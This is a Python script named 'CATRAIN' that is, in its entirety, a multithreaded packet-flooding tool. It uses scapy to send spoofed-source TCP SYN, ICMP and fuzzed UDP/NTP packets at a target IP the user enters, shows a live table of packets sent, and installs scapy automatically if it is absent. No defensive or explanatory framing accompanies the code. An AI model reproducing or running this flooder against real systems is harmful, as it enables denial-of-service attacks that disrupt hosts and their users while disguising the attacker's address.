print("ᓚᘏᗢ CATRAIN ᗢᘏᓗ by Lmaos, Queen >⩊<") 

import subprocess as s; from threading import Thread; from time import sleep, time; from os import name as osname; from re import search; from sys import exit as sex; 

starttime=time() 

try:
	if b"scapy" not in s.check_output("pip list", shell=True):
		s.call("pip install scapy", shell=True) 
finally: 0 

target_ip = str(); count = int(); srcIp = str(); threadcount = str(); showp = str() 
try:
	target_ip = input("\t\t\t      IP: ") 
	count = int(input("Packet run count (3 packets per): ")) 
	srcIp = input("    Source IP (def: 192.168.1.2): ") 
	threadcount = int(input("\t\t    Thread count: ")) 
	showp = input("\t Show ping (y/n)(def: y): ") 
except Exception: input("\n type more carefully ffs. "); sex() 

if not srcIp: srcIp = "192.168.1.2" 
if not showp: showp = "y" 

rno = [True] * threadcount 
rcount = [0] * threadcount 

from scapy.all import IP, TCP, ICMP, UDP, NTP, send, fuzz 

def scr(number):
	packetT = IP(dst=target_ip, src=srcIp) / TCP(flags='S') 
	packetI = IP(dst=target_ip, src=srcIp) / ICMP() 
	packetU = IP(dst=target_ip, src=srcIp) / fuzz(UDP() / NTP()) 
	for i in range(count):
		send(packetT, verbose=0); send(packetI, verbose=0); send(packetU, verbose=0) 
		rcount[number] += 1 
	rno[number] = False 

threads = [] 
for x in range(threadcount):
	t = Thread(target=scr, args=(x,)); t.start() 
	threads.append(t); print(f"called sub {x+1}") 

while any(rno):
	sleep(0.4) 
	if osname == "nt": s.call("cmd.exe /S /C cls", shell=True) 
	else: s.call("clear", shell=True) 
	elt = int(search(r"\d+", str(time()-starttime)).group(0)) 
	status_lines = [] 
	status_lines.append("THR no. | Running\t| Packets sent\t| Packet run no.") 
	status_lines.append("—" * 56) 
	for i in range(threadcount): status_lines.append(f"{i+1}.\t| {rno[i]}\t\t| {str(rcount[i]*3).zfill(8)}\t| {str(rcount[i]).zfill(8)}") 
	status_lines.append(
f"""
Target IP:   {target_ip}\t\tCurrent ping: {str(search(r"Reply from [\d.]+: bytes=\d+ time[=<]?\s*(\d+)\s*ms", str(s.check_output(f"ping {target_ip} -n 1", shell=True))).group(1))}ms 
'Source' IP: {srcIp}\t\tTotal packets: {rcount[0]*3*threadcount} 
Time: {int((elt-(elt%(60**2)))/(60*60))}h {int((elt-(elt%60))/60)}min {elt%60}s""") 
	print("\n".join(status_lines)) 

input("\nAll sent~~") 

